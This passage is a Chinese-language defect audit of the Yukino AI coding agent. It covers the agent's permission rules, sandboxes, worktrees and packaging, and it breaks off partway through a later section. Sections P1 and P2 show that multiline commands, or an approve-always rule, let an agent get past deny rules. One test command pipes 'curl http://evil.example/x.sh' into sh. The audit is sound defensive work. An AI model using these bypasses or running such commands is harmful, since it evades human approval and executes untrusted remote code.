# Yukino (apps/yukino) 缺陷探索报告（pi）

- 探索日期：2026-10-18
- 探索人：pi（独立于 `defects-reported-by-codex.md` 的第二轮全量探索）
- 探索范围：`apps/yukino/src/` 全部 313 个源文件（约 6.6 万行），重点精读：agent 主循环与 StreamingExecutor、权限系统、OS 沙箱（seatbelt/bwrap）、Bash/PowerShell/文件/搜索工具、会话持久化与 compact、LLM 客户端（Anthropic/OpenAI/Compat）、remote/ACP/A2A 服务、团队与子代理、worktree、memory/feedback/skills/hooks/telemetry、库打包（tsup 双构建）、UI 关键路径。
- 方法：源码精读 + 针对性 grep + **可复现实测脚本**（权限判定、沙箱行为、FileStateCache、库入口可导入性）。所有标注「实测」的结论均在本机（macOS/seatbelt，Node v24）运行验证。

## 基线健康度（本次实测）

| 检查             | 结果                                                     |
| ---------------- | -------------------------------------------------------- |
| `pnpm typecheck` | 通过（exit 0）                                           |
| `pnpm test`      | **2410 passed / 1 skipped**（156 个测试文件全绿，75.9s） |
| `pnpm lint`      | 通过（--quiet 无 error）                                 |

总体评价：代码库工程质量很高——原子写 + rename、跨进程文件锁（bakery 算法 + 死进程回收）、UTF-8 安全截断、timing-safe token 比较、秘密 redaction、进程组 kill + SIGKILL 升级、退出清理注册表、流式终态守卫等防御性设计非常扎实。以下发现按「真实缺陷」与「设计意图」分类，每条给出定位、验证方式与定性。

---

## 一、真实缺陷

### P1【高危｜安全】多行 Bash 命令可绕过锚定的 deny/ask 权限规则；bypassPermissions 下 deny 规则完全失效

- 位置：`src/permissions/index.ts`
  - `globMatch()`：把 `Tool(pattern)` 编译为 `^...$` 正则，`*` → `.*`，**不带 `s` 标志，`.` 不匹配换行符**；
  - `PermissionChecker.check()` Layer 1：用**整条命令字符串**做规则匹配；
  - Layer 3.5 的子命令切分（按 `&&`、`||`、`&`、`;`、`|`、`\n`、`\r` 切分后逐段评估 deny/ask）**只在 `sandboxEnabled && sandboxAutoAllow && toolName === "Bash"` 路径生效**，代码注释明确其目的就是「防止把子命令藏在切分器保留的段里从而躲过锚定 deny/ask 规则」，但该保护没有应用到通用路径。
- 实测（规则 `Bash(rm -rf *)` → deny，写入项目级 permissions.yaml）：

  | 模式              | 命令                     | 结果                                       |
  | ----------------- | ------------------------ | ------------------------------------------ |
  | default           | `rm -rf /tmp/x`          | `deny`（符合预期）                         |
  | default           | `echo ok\nrm -rf /tmp/x` | **`ask`（deny 被绕过，降级为询问）**       |
  | default           | `rm -rf /tmp/x\necho ok` | **`ask`（同上）**                          |
  | bypassPermissions | `rm -rf /tmp/x`          | `deny`                                     |
  | bypassPermissions | `echo ok\nrm -rf /tmp/x` | **`allow`（deny 规则被完全绕过）**         |
  | bypassPermissions | `rm -rf /tmp/x && echo`  | `deny`（单行 `*` 可跨 `&&`，仅换行能绕过） |

- 影响：README 第 336 行明确承诺「Explicit deny/ask rules … still apply」（即使 bypassPermissions）；print 模式（`-p` 恒为 bypassPermissions）、CI 脚本、Shift+Tab bypass 模式下，模型（或被提示注入诱导）只需用换行把危险命令包进多行命令，即可整段绕过用户配置的 deny 黑名单；default/acceptEdits 模式下 deny 被静默降级为 ask，用户可能在不知情时批准本应硬性拦截的命令。
- 定性：**真实缺陷**（与代码自身注释声明的反绕过意图、README 承诺均矛盾）。与 codex 报告 D1 独立得出相同结论，实测数据一致。
- 修复建议：把 Layer 3.5 的子命令切分评估推广到所有模式的 deny/ask 判定（Bash/PowerShell 的 command 先切分再逐段 `evaluateRules`，任一段 deny 即 deny、任一段 ask 即 ask）。

### P2【中高危｜安全】allow-always 持久化的命令规则过宽：无词边界 + 命令链整体放行

- 位置：`src/permissions/index.ts` `PermissionChecker.allowAlways()`——命令类工具持久化模式为「前 1-2 个词 + `*`」；`globMatch` 的 `*` 可匹配 `&|;` 等任意字符（单行内）。
- 实测：对 `git push origin main` 选择「始终允许」后：
  - 持久化规则为 `Bash(git push*)`；
  - `git push origin main && curl http://evil.example/x.sh | sh` → **`allow`（无任何确认）**；
  - `git pushfoo bar` → **`allow`（无词边界，`git pushfoo` 也命中）**。
- 影响：一次针对良性命令的「始终允许」会持久化（写入 `~/.yukino/projects/<key>/permissions.yaml`，跨会话长期有效）为可覆盖任意命令链的放行规则，HITL 审批被绕过。
- 定性：**真实缺陷**（「命令族放行」的宽度是注释声明的设计，但命令链跟随前缀放行与 P1 中代码自己声明的反绕过意图矛盾）。与 codex 报告 D2 一致，实测数据一致。
- 修复建议：生成规则时加词边界约束（如 `git push *` 并要求后续为空白/结尾，或双规则 `git push`/`git push *`）；匹配 allow 规则前同样做子命令切分（每段都被 allow 才放行）。

### P3【中危｜功能】OS 沙箱禁止写 /dev/null，极常见的 shell 习惯写法在沙箱内失败、`&&` 链断裂

- 位置：`src/sandbox/seatbelt.ts` `buildProfile()`（`(deny default)` 仅对 allowWrite 放行 `file-write*`）、`src/sandbox/bwrap.ts` `prepare()`（`--ro-bind / /` 且无 `--dev /dev`）。`src/bootstrap/sandbox.ts` 的 allowWrite 只有 `[cwd, tmpdir()]`。
- 本机实测（macOS，直接调用 `SeatbeltSandbox.prepare()` 生成的命令，cwd 在 allowWrite 内）：

  ```text
  命令: echo hello > /dev/null && echo DEVNULL_OK; touch ./sbx-test-file && echo CWD_WRITE_OK; echo test 2>/dev/null
  exit: 1
  stdout: "CWD_WRITE_OK\n"
  stderr: "bash: 行 1: /dev/null: Operation not permitted" ×2
  ```

  `DEVNULL_OK` 未输出（`&&` 链被截断），`2>/dev/null` 同样报错。

- 影响：`sandbox.enabled: true` 后，模型生成的 `cmd >/dev/null 2>&1`、`cmd 2>/dev/null || true` 等写法会报错或改变控制流；`sandbox.auto_allow` 依赖沙箱可用性，该缺陷会放大为工具执行失败。bwrap 侧为语义推断（`--ro-bind / /` 下写 /dev/null 得 EROFS），未在 Linux 实测。
- 定性：**真实缺陷**（README 只承诺「后端不可用时 fail closed」，未声明会拦截 /dev 写入）。与 codex 报告 D3 一致，本机实测复现。
- 修复建议：seatbelt profile 追加 `(allow file-write* (literal "/dev/null"))`（可一并考虑 `/dev/zero`、`/dev/tty`、`/dev/stdout`、`/dev/stderr`）；bwrap 追加 `--dev /dev`。

### P4【中危｜功能】worktree 隔离 × 权限/沙箱体系未打通：EnterWorktree「进入」未实现，worktree 写入在 acceptEdits 下仍逐次弹权限，OS 沙箱下 Bash 完全无法写 worktree

这是本次探索发现的**新缺陷**（codex 报告未覆盖），由三个相互关联的事实构成：

1. **EnterWorktree 只创建不进入**：`src/tools/enter-worktree.ts` 创建 worktree 后仅返回路径，全代码库无任何机制把会话/工具的 cwd 切换进去（工具描述却写「Create and **enter** a git worktree for isolated work」）。后续 WriteFile/EditFile 相对路径仍解析到原 cwd。
2. **PathSandbox 不把 worktree 加入允许根**：worktree 位于 `~/.yukino/worktrees/<key>/<slug>`，不在 `PathSandbox.allowedRoots`（= [projectDir, tmpdir()]）内。实测：

   ```text
   write into worktree (default):     ask - Path …/.yukino/worktrees/abc123/fix-login/a.ts is outside allowed directories
   write into worktree (acceptEdits): ask - Path …（同上，acceptEdits 也逐次询问）
   ```

   即主代理用 EnterWorktree 后，对 worktree 的每一次文件写都要人工批准（fail-safe 但使「隔离工作」不可用）。`PermissionChecker.allowExtraRoot()`（注释：「Allow writes to an extra directory outside the project + os.tmpdir()」）正是为此设计的 API，但**全库无任何生产代码调用它**（仅 `tests/permissions.test.ts` 引用）——属死代码，也印证该接线缺失。

3. **OS 沙箱 allowWrite 不含 worktree**：`BashTool.sandboxConfig` 是实例级（`[cwd, tmpdir()]`），子代理/主代理进入 worktree 后不会更新。`filterToolsForAgent`/`cloneRegistryForFork` 对 BashTool 走 `registerBorrowed`（同一实例），因此 `sandbox.enabled: true` 时，worktree 隔离子代理（`Agent isolation=worktree`）或主代理 `cd` 进 worktree 后的 Bash 写入（git commit、文件写）会被 seatbelt/bwrap 拒绝（P3 的实测已证明 allowWrite 之外的写入被拒）。对照：`Agent` 工具的 worktree 路径对**权限**做了 `checker.forCwd(worktree.path)` 重定根，但同样没有处理 OS 沙箱的 allowWrite——说明正确的接线模式存在，只是没做全。

- 影响：EnterWorktree 与 `Agent isolation=worktree` 两个「隔离工作」特性在 default/acceptEdits 模式下体验破碎（逐次弹窗），在 sandbox.enabled 时 Bash 侧功能直接失效。
- 定性：**真实缺陷**（特性组合缺口 + 死代码；README 未声明此限制）。
- 修复建议：EnterWorktree 成功后调用 `checker.allowExtraRoot(worktreePath)` 并把 worktree 追加进 `BashTool.sandboxConfig.allowWrite`；`Agent` worktree 隔离路径同样补 OS 沙箱 allowWrite；或让 EnterWorktree 真正切换 ctx.cwd（与工具描述一致）。

### P5【中危｜打包】库入口把 optionalDependencies（遥测栈）变成硬依赖：未安装可选依赖时 `import "@yukino.js/yukino"` 直接失败

这是本次探索发现的**新缺陷**（codex 报告未覆盖）。

- 位置：
  - `src/telemetry/index.ts` 第 3 行：`export * as Providers from "./providers.js";` —— **静态**再导出；
  - `src/telemetry/providers.ts` 顶部**静态** import `@langfuse/otel`、`@langfuse/tracing`、`@opentelemetry/api`、`@opentelemetry/api-logs`、`@opentelemetry/resources`、`@opentelemetry/sdk-logs`、`@opentelemetry/sdk-metrics`、`@opentelemetry/sdk-trace-base`、`@opentelemetry/semantic-conventions`（均为 optionalDependencies；仅 OTLP exporter 与 `@sentry/node` 是动态 import）；
  - `src/index.ts`：`export * as Telemetry from "./telemetry/index.js";` 使其进入库 barrel 的静态模块图。
- 与声明意图矛盾：`tsup.config.ts`（libConfig）注释明确写道「optionalDependencies (the telemetry stack) are external too: **they are loaded lazily behind a guarded dynamic import and degrade to a noop runtime when absent** — bundling them would defeat their optionality」。`initializeTelemetry()` 里的 `import("./providers.js").catch(() => { runtime = noopRuntime })` 确实做了守卫降级——但 barrel 的静态再导出让 providers.js 在**任何** `import "@yukino.js/yukino"` 时就被加载，守卫形同虚设。
- 实测（把 `dist/lib` 复制到隔离目录，node_modules 只链接常规依赖、不含 @langfuse/@opentelemetry/@sentry）：

  ```text
  import FAILED: ERR_MODULE_NOT_FOUND - Cannot find package '@langfuse/otel'
      imported from …/lib/chunk-OOKUQI77.js
  ```

  且 `dist/lib/index.js` 第 6 行即静态 `import … from "./chunk-OOKUQI77.js"`，该 chunk 第 15/19 行静态 import `@langfuse/otel`/`@langfuse/tracing`。

- 影响：CLI（dist/main.js，noExternal 全量内联）不受影响；但**库消费者**（package.json `exports."."` → dist/lib/index.js）若以 `--omit=optional`/`--no-optional` 安装、或其包管理器跳过可选依赖，导入任何命名空间（哪怕只用 `Agent`/`Utils`）都会在模块解析阶段崩溃。
- 定性：**真实缺陷**（与 package.json 的 optionalDependencies 声明和 tsup 注释的自身设计直接矛盾）。
- 修复建议：从 `src/telemetry/index.ts` 移除 `export * as Providers from "./providers.js"`（或改为仅导出类型的惰性形式），保持 providers.js 只经由 `initializeTelemetry()` 的守卫动态 import 可达；可在 `tests/build-guards.test.ts` 增加「lib 产物不得静态引用 optionalDependencies」的断言防回归。

### P6【低中危｜功能】文件类 allow-always 规则对相对路径（及非规范化路径）不生效，「始终允许」静默失效

- 位置：`src/permissions/index.ts` `allowAlways()`（把 `file_path` 解析为**绝对路径**后持久化，如 `WriteFile(/abs/src/*)`）与 `check()`/`extractContent()`（Layer 1/5 规则匹配发生在**原始参数文本**上；只有 Layer 4 的 PathSandbox 做 `resolveToolPath`）。
- 实测：对相对路径 `src/a.ts` 点「始终允许」→ 持久化 `WriteFile(/tmp/…/src/*)`；随后
  - 绝对路径写 `…/src/b.ts` → `allow`；
  - 相对路径写 `src/b.ts` → **`ask`（规则未命中）**。
    反向同样：绝对路径授权的规则遇到相对路径调用仍不命中。
- 影响：工具描述明确支持「绝对或相对路径」，模型两种写法都会出现；「始终允许」对文件写入经常静默失效，用户被反复弹窗（fail-safe 方向，无安全风险）。与 codex 报告 D4 一致，实测复现。
- 定性：**真实缺陷**（功能正确性）。
- 修复建议：规则匹配前对文件类工具 content 做与 `allowAlways` 相同的 `resolveToolPath` + `canonicalPath` 归一化（持久化与匹配两侧用同一归一化）。

### P7【低危｜功能】FileStateCache 缓存键未规范化：符号链接拼写 / `/tmp` 与 `/private/tmp` 被当成两个文件

- 位置：`src/tools/file-state-cache.ts`——键是未经 realpath 的路径；对照 `src/tools/file-mutation-queue.ts` 做了 canonical 化，两者不一致。
- 实测（macOS）：`record("/var/folders/…/a.txt")` 后 `check("/private/var/folders/…/a.txt")` → `file has not been read yet, read it first before editing.`
- 影响：模型若以两种拼写（符号链接/真实路径）读写同一文件，会误报「未读过/已被修改」，需要多一轮 ReadFile（fail-safe，仅体验与效率问题）。与 codex 报告 D5.2 一致，实测复现。
- 定性：**真实缺陷**（轻微）。
- 修复建议：record/check/update 统一用 `canonicalPath(resolveToolPath(cwd, path))` 作键。

### P8【低危｜竞态】cleanExpiredSessions 在锁外删除 `*.rewind-tmp`，与并发 rewind 存在窄竞态

- 位置：`src/session/index.ts` `cleanExpiredSessions()`——进入即无条件 `rmSync(join(dir, entry), { force: true })` 删除所有 `.rewind-tmp`；而 `truncateSessionLines()` 的临时文件（`<file>.<pid>.rewind-tmp`）在 `withFileSyncLock(filePath)` 内 write→rename。清理路径没有获取同一把锁。
- 场景：进程 A 正在 rewind（tmp 已写、rename 未执行），进程 B 首次 `listSessions` 触发清理并删掉该 tmp → A 的 `renameSync` 抛 ENOENT，rewind 失败。窗口极小（两条同步语句之间），触发概率很低。
- 定性：**真实缺陷**（低危竞态）。
- 修复建议：清理 `.rewind-tmp` 前先 `tryAcquireFileSyncLock` 对应 `.jsonl`，拿不到锁就跳过；或按 mtime 给 tmp 文件一个宽限期（如 >1h 才删）。

### P9【极低危｜语义】agent run() 的 finally 中 session_end 钩子异常会覆盖正常完成语义

- 位置：`src/agent/index.ts` `run()` finally：`await this.fireLifecycle("session_end").catch((error) => { outcome = "error"; throw error; })`——若 session_end 抛错，会在 `loop_complete` 已 yield 之后向消费者抛出异常，把一次成功运行变成错误。
- 实际触发概率极低：`HookEngine.fire()` 对同步/异步钩子错误都已按 `on_error` 策略内部消化，`fireLifecycle` 几乎不可能抛出。
- 定性：**真实缺陷（理论性，极低危）**。与 codex 报告 D5.4 一致。
- 修复建议：finally 中的 session_end 失败只记录日志、不重抛（或至少不覆盖 `outcome`）。

### P10【极低危｜卫生】SAFE_PREFIXES 重复项与死代码

- `src/permissions/index.ts` `SAFE_PREFIXES`：`head`、`tail`、`wc` 各出现两次（「Cross-platform」段与「File content viewing」段）；无功能影响，纯冗余。
- `PermissionChecker.allowExtraRoot()` 无生产调用方（见 P4），按 AGENTS.md「积极删除死代码」应删除或在 P4 修复中接线。
- 定性：**真实缺陷（卫生级）**。与 codex 报告 D5.3 一致。

---

## 二、设计意图（非缺陷，列出以便复核）

以下行为经 README、代码注释或实现确认为**有意设计**，不计为缺陷：

1. **`DANGEROUS_PATTERNS` 为空，Layer-3 危险命令拦截休眠**（`src/permissions/index.ts`）：注释明确「Intentionally empty … stays inert until patterns are added」。当前没有内置危险命令黑名单，全部依赖 HITL 与用户规则。注意：这意味着 P1/P2 的规则绕过没有第二道内置兜底，建议评估补充。
2. **WebFetch 无 SSRF 限制，可访问内网/环回/云元数据**：README 明确「Direct HTTP/HTTPS access, including project intranet endpoints, remains supported」。存在有意的不对称：`InstallSkill` 走 `fetchPublicHttpUrl`（DNS 解析 + 私网段黑名单 + 重定向逐跳复检 + 地址 pinning，`src/utils/public-http.ts`，实现质量很高），WebFetch 不走。若未来收紧可复用该模块。
3. **print 模式（`-p`）恒为 bypassPermissions**：README 明确「Print mode intentionally bypasses permission prompts, so only run it on trusted prompts」。结合 P1：CI 场景下 deny 规则是多行命令的唯一防线，P1 的修复对 CI 场景价值最高。
4. **ReadFile/Glob/Grep 可读项目外任意路径且免审批**：README 明确「read-only tools can access paths outside the working directory without path approval」。
5. **服务暴露面**：A2A 仅强制 loopback、无 token（README：「The server only binds loopback addresses」）；ACP-WS 强制 loopback + token；Remote 模式 HTTP 静态资源无鉴权但仅服务前端静态文件（`serveStatic` 的 normalize + 前缀 `..` 剥离 + 目录前缀校验经分析不可穿越），所有操作走 token（32B base64url + timingSafeEqual）+ Origin 校验的 WebSocket。整体为「loopback + token」设计。
6. **`max_tokens` 命中且存在工具调用时，整批工具调用（含 JSON 已完整的前序调用）一律标记 parseError 拒绝执行**（`src/agent/index.ts`）：「不完整响应不得执行待决工具」的保守设计，代价是丢弃同批完整调用、多一轮重试。
7. **Glob/Grep 跳过固定目录集合**（`.git`、`.agents`、`.yukino`、`node_modules`、`dist`、`__pycache__` 等，`src/tools/types.ts` SKIP_DIRS）：工具描述明确声明「skips fixed directories … not rules from .gitignore」。副作用：模型无法用 Glob/Grep 搜 `.agents/skills` 与 `dist`（技能加载走 catalog 直接 readdir，不受影响）。
8. **用户 `!` 命令不走权限检查**（`src/conversation/user-bash.ts` 的 ctx 不含 permissionChecker）：用户亲手输入即授权；`!!` 进一步排除上下文、禁用超时与后台化（`shellTimeoutDisabled: true`、`taskManager: null`），均为显式设计。
9. **hooks 条件表达式用 `new Function` 求值**（`src/hooks/index.ts`）：注释已论证配置文件本身即授予任意 shell 执行权，不引入新权限。
10. **`yukino update` 供应链加固**：固定 `--registry=https://registry.npmjs.org/`，且仅在确认安装由全局 npm/yarn/pnpm 管理时才执行（`src/update/install.ts`）。
11. **EnterWorktree 返回绝对路径供调用方使用**：README「Git worktrees」节描述了路径布局与「returns the absolute worktree path to the caller」——但「enter」语义与权限/沙箱接线缺失仍构成 P4 缺陷，两者不冲突。
12. **TaskManager 的 `nextTaskId` 为模块级全局计数器**：保证进程内跨 manager 的任务 ID 唯一（`useSession` 恢复时还会按存量记录抬升），属有意设计。

---

## 三、检查过且确认健壮的部分（抽样，供覆盖度参考）

- 会话持久化：JSONL 追加 + 跨进程文件锁 + compact boundary 内联保留尾段；`rebuildFromSession` 对损坏 boundary 的逐级回退；`truncateSessionLines` 的 write-tmp-rename。
- Bash/PowerShell：进程组 detach + SIGTERM→SIGKILL 升级 + pid 复用守卫（`exited`/`alreadyExited`）、5GB 输出看门狗、后台化时序守卫（`terminating`/`settled`/`backgrounded`）、退出清理注册表防孤儿、fd 模式 stdio 避免孙进程扣住结果。
- `StreamingExecutor` 乱序完成/顺序产出的唤醒机制（分析无竞态）；`ensureToolPairing` 孤儿工具调用修补；`applyBudget`/spill 的读回豁免（防 spill↔readback 循环）。
- LLM 层：Anthropic/OpenAI/Compat 流式解析、`message_stop`/终态事件守卫（防半截流被当作完整回合）、usage 锚点、错误分类、可中断重试、上下文过长自压缩（PTL 头部截断重试、保留尾段不拆 tool_use↔tool_result 对、压缩期间会话变更检测）。
- 远程/浏览器：WS token + Origin 校验、心跳清扫、`stop()` 全量资源回收、权限请求 5 分钟超时自动 deny、steering/follow-up 队列语义。
- 团队：文件邮箱 write-then-rename + 锁、文件锁 bakery 算法（陈旧条目仅在属主进程死亡时回收）、teammate 主循环的 plan 审批状态机、停止时的任务释放。
- worktree：ref 名白名单（`SAFE_REF_RE` + `..`/前导 `-`/`/` 拒绝）、纯文件系统 HEAD 读取、`worktree remove`/`branch -d` 保守删除（有变更即保留）、`.worktreeinclude` 的 `..` 防护、node_modules 符号链接。
- EditFile/WriteFile：CRLF 等价匹配 + 游离 CR 重试、批量编辑重叠/唯一性校验、read-before-write 门禁、写前二次校验 mtime。
- ComputerUse：并发不安全标记、OpenAI 批量动作 schema 校验、坐标非负约束。
- 记忆：索引行/字节双上限 + 截断告警、consolidation 时间/会话双闸门 + 文件锁、`MemoryPermissionChecker` 作用域限制、frontmatter 解析容错。
- 反馈：多层 redaction（键名归一化 + URL 凭据剥离 + 已知 token 前缀 + Bearer + 已知秘密值替换）、发 issue 前用户批准、gh CLI/token/browser 三通道降级、URL 编码截断不切断多字节字符。
- 技能：安装 1MiB 上限、SSRF 加固下载、安装路径逐级拒绝符号链接（含悬空链接）、临时文件 + rename、热重载 mtime 判定。
- LSP 客户端：Content-Length 分帧 + 8KB/16MB 上限、请求超时/中断、只读客户端方法应答、优雅 shutdown + SIGKILL 兜底。
- 其他：SemVer 比较（含 prerelease 优先级规则，核对无误）、`isNewerVersion`、UTF-8 安全截断（shell 输出/grep 行/记忆索引/feedback URL）、`intArg`/`boolArg` 宽容解析、遥测 payload scrubbing。

---

## 四、结论与建议优先级

| 编号 | 结论                                                       | 严重度   | 建议优先级                                                    |
| ---- | ---------------------------------------------------------- | -------- | ------------------------------------------------------------- |
| P1   | 多行命令绕过 deny/ask 规则                                 | 高       | P0（子命令切分推广到全模式）                                  |
| P2   | allow-always 命令链整体放行                                | 中高     | P1（规则生成加词边界 + allow 匹配前切分子命令）               |
| P3   | 沙箱禁止写 /dev/null                                       | 中       | P1（seatbelt/bwrap 放行 /dev 常用节点）                       |
| P4   | worktree 隔离与权限/沙箱未打通（含 allowExtraRoot 死代码） | 中       | P1（接线 allowExtraRoot + 沙箱 allowWrite；或真正切换 cwd）   |
| P5   | 库入口静态依赖 optionalDependencies                        | 中       | P1（移除 barrel 对 providers.js 的静态再导出 + 构建守卫测试） |
| P6   | 文件 allow-always 不匹配相对路径                           | 低中     | P2（规则两侧路径归一化）                                      |
| P7   | FileStateCache 键未规范化                                  | 低       | P3（canonical 键）                                            |
| P8   | rewind-tmp 清理竞态                                        | 低       | P3（加锁或宽限期）                                            |
| P9   | session_end 钩子异常覆盖完成语义                           | 极低     | P3（finally 内不重抛）                                        |
| P10  | SAFE_PREFIXES 重复项/死代码                                | 极低     | P3（清理）                                                    |
| 二-1 | 危险命令黑名单休眠                                         | 设计意图 | —（建议评估补充 DANGEROUS_PATTERNS 作为兜底）                 |
| 二-2 | WebFetch 无 SSRF 限制                                      | 设计意图 | —（如需收紧复用 `utils/public-http.ts`）                      |

与 codex 报告的关系：P1–P3、P6、P7、P9、P10 与 codex D1–D5 独立相互印证（实测数据一致）；**P4（worktree×权限/沙箱）与 P5（库入口 optionalDependencies）为本次探索新发现**，codex 报告未覆盖。

验证环境：macOS（seatbelt 实测）、Node v24.16.0、pnpm test/typecheck/lint 全绿。bwrap 相关结论为语义推断（未在 Linux 实测），已在 P3/P4 中标注。

---

# 第三轮探索补充（复核 + 新发现，全部以代码事实为准独立验证）

- 探索日期：2026-10-18（第三轮）
- 方法：按「其他 agent 的探索结果仅供参考，以代码事实为准」的要求，本轮对既有 P1–P10 全部重新独立复核（源码精读 + 本机实测），并继续探索前两轮未覆盖的模块：review 全链路（diff-parser/git/resolve/relocate/filter/selection/grouping/runner）、todo 与 teams 任务依赖、conversation/at-expand、feedback（collect/analyze/redact/zip/github/pipeline）、mcp strategy、llm 双协议客户端、a2a/acp 协议层、images、tools/diff、execution-coordinator、shell-background、update/install、skills（catalog/executor/install）、memory（extractor/instructions/consolidation）、logger、storage/paths、websocket-security、cli/print-mode/main、lsp client、commands/loader、plan-file、goal、hooks、file-history、worktree、remote server 关键路径、ui（terminal-input/input/text-field/input-paste/use-terminal-controls）。
- 引用 codex/yukino 报告的条目均经本轮源码或实测**逐条重新验证**后才收录；与代码事实不符的结论列入「更正」节，不收录。
- 基线复核（本轮实测）：`pnpm test` → **156 个测试文件 / 2410 passed / 1 skipped**（88.34s，exit 0）。

## 五、既有 P1–P10 独立复核结论：全部成立

| 编号 | 复核方式                                                                                                                                                                                      | 复核结果                                                                                                                                                                                                         |
| ---- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| P1   | 代码复核（`globMatch` 编译 `^…$` 无 `s` 标志，`.` 不匹配换行；Layer 3.5 子命令切分仅限 `sandboxEnabled && sandboxAutoAllow && toolName === "Bash"` 路径，permissions/index.ts:661-699）+ 实测 | 成立：规则 `Bash(rm -rf *)`→deny 下，`echo ok\nrm -rf /tmp/x` 在 default 模式 → **ask**（deny 被绕过），在 bypassPermissions → **allow**；单行 `rm -rf /tmp/x` 两种模式均 deny                                   |
| P2   | 代码复核（`allowAlways` 命令类取前 2 词 + `*`，permissions/index.ts:748-751）+ 实测                                                                                                           | 成立：对 `git push origin main` 始终允许后，`git push origin main && curl http://evil.example/x.sh \| sh` → **allow**；`git pushfoo bar` → **allow**（无词边界）                                                 |
| P3   | 代码复核（seatbelt `(deny default)` 仅对 allowWrite 放行 `file-write*`；bwrap `--ro-bind / /` 无 `--dev /dev`）+ seatbelt 实测                                                                | 成立：`echo hello > /dev/null && echo DEVNULL_OK` → exit 1，stderr「/dev/null: Operation not permitted」，`DEVNULL_OK` 未输出（`&&` 链断裂），cwd 内写入正常                                                     |
| P4   | 代码复核（enter-worktree.ts 仅返回路径不切换 cwd；`allowExtraRoot`/`PathSandbox.addRoot` 全库无生产调用方（grep 证实）；bootstrap/sandbox.ts allowWrite=[cwd, tmpdir()] 实例级固定）+ 实测    | 成立：对 `~/.yukino/worktrees/<key>/<slug>/a.ts` 的 WriteFile 在 default 与 acceptEdits 下均 → **ask**（"outside allowed directories"）                                                                          |
| P5   | 代码复核（telemetry/index.ts:3 静态 `export * as Providers`；tsup.config.ts:277-282 注释声明「lazily behind a guarded dynamic import」）+ 构建产物检查                                        | 成立：`dist/lib/index.js:6` 静态 import `chunk-OOKUQI77.js`，该 chunk 第 15 行静态 `import { LangfuseSpanProcessor } from "@langfuse/otel"` —— 守卫动态 import（telemetry/index.ts:114）被 barrel 静态再导出架空 |
| P6   | 实测                                                                                                                                                                                          | 成立：对相对路径 `src/a.ts` 始终允许（持久化 `WriteFile(/abs/src/*)`）后，绝对路径写 → allow，相对路径写 → **ask**（规则不命中）                                                                                 |
| P7   | 实测                                                                                                                                                                                          | 成立：`record("/var/folders/…/f.txt")` 后 `check("/private/var/folders/…/f.txt")` → 「file has not been read yet」（同一文件两种拼写被当成两个键）                                                               |
| P8   | 代码复核                                                                                                                                                                                      | 成立：`cleanExpiredSessions`（session/index.ts:649）在**锁外**无条件 `rmSync` 所有 `*.rewind-tmp`；`truncateSessionLines` 的 tmp（:289）在 `withFileSyncLock` 内 write→rename，两者不共享锁，存在窄竞态窗口      |
| P9   | 代码复核                                                                                                                                                                                      | 成立：agent/index.ts:1096 finally 中 `fireLifecycle("session_end").catch(… throw error)` 会在 `loop_complete` 已 yield 后向消费者抛错并把 outcome 改写为 error                                                   |
| P10  | 代码复核                                                                                                                                                                                      | 成立：SAFE_PREFIXES 中 `head`、`tail`、`wc` 各出现两次（「File content viewing」段与顶部段重复）                                                                                                                 |

## 六、新发现的真实缺陷（三份报告均未覆盖）

### P11【中低危｜功能】cancelled 阻塞任务永久卡死依赖任务，且依赖链接无法解除（已实测）

- 位置：`src/todo/dependencies.ts:7-16` —— `unresolvedTaskDependencies` 的 resolved 集合只认 `status === "completed"`；消费点：`src/todo/index.ts:198,263`（TaskList update/replace 的 in_progress 门禁）、`src/teams/shared-task.ts:251`（团队共享任务板同一门禁）、`src/todo/tools.ts:181`（TaskList 展示的 blocked-by 列表）。
- 机制：代码库其他位置一致把 `cancelled` 当作与 `completed` 并列的终态 —— `shared-task.ts:210` 拒绝重新认领 cancelled 任务（"already cancelled; reopen it as pending first"）、`releaseOwner`（:298-299）跳过 completed/cancelled —— 唯独依赖解除只认 completed。阻塞任务被取消后，其依赖任务**永远**无法进入 in_progress。
- 且无解除手段：`TaskUpdates`/`TaskUpdateFields` 只有 `addBlocks`/`addBlockedBy`，没有任何移除依赖的 API；直接传 `blockedBy: []` 会被 `validateTaskDependencies` 的双向一致性校验拒绝。唯一 workaround 是删除已取消的任务（delete 顺带清链接），但这会抹掉取消记录。
- 实测（tsx 直跑 `TaskList`）：

  ```text
  #1 setup env ← #2 run tests（#2 blockedBy #1）
  update #1 → cancelled                 成功
  update #2 → in_progress               抛 "Task #2 is blocked by: 1"
  update #2 blockedBy=[]（尝试清链接）   抛 "Inconsistent dependency between task #1 and #2"
  ```

- 影响：团队/待办编排中「取消 A、继续被 A 阻塞的 B」是常见流程，会直接卡死；模型收到报错后通常只能删除已取消任务，丢失审计痕迹。todo 私有任务板与 teams 共享任务板同时受影响。
- 定性：**真实缺陷**（语义不一致：同一状态机中 cancelled 处处是终态，唯独依赖解除不认）。
- 修复建议：resolved 集合改为 `completed || cancelled`；或补充 `removeBlocks`/`removeBlockedBy` API。

### P12【低危｜功能】@引用紧邻标点时不展开，文件上下文静默丢失（已实测）

- 位置：`src/conversation/at-expand.ts:49-56` —— `collectAtRefs` 正则最后一个分支 `@([^\s]+)` 把尾随标点一并捕获进路径。
- 实测（`expandAtRefs`，目录下存在 foo.ts）：

  ```text
  "see @foo.ts."   → 不展开（statSync("foo.ts.") ENOENT → 静默跳过）
  "see (@foo.ts)"  → 不展开
  "see @foo.ts,"   → 不展开
  "see @foo.ts"    → 正常展开
  ```

- 影响：自然书写中 @引用后紧跟句号/逗号/括号时，用户期望附带的文件内容不进入上下文，且无任何提示（fail-safe 方向，但模型看不到用户明确引用的文件，用户不知情）。UI 下拉补全插入的是干净 token，引号形式 `'@…'`/`"@…"` 也不受影响，故主要影响手打引用。
- 定性：**真实缺陷**（低危；注释「Tokens that don't resolve … left untouched」是兜底设计，但未剥离常见尾随标点属解析缺口）。
- 修复建议：对未加引号的捕获剥离尾部 `.,;:!?)]}'"`（被剥离字符保留在消息原文中）。

### P13【低危｜性能】TerminalInput 大粘贴逐字符转发同步阻塞事件循环（复杂度实为线性 —— 同时更正 yukino M-3 的 O(n²) 论断）

- 位置：`src/ui/terminal-input.ts:50-85` —— `_transform` 的 while 循环逐字符 `output += this.pending[0]; this.pending = this.pending.slice(1)`。
- 实测（本机 Node v24，单 chunk bracketed-paste 载荷）：

  ```text
   256 KB →  11.3 ms
  1024 KB →  51.6 ms
  4096 KB → 231.9 ms
  ```

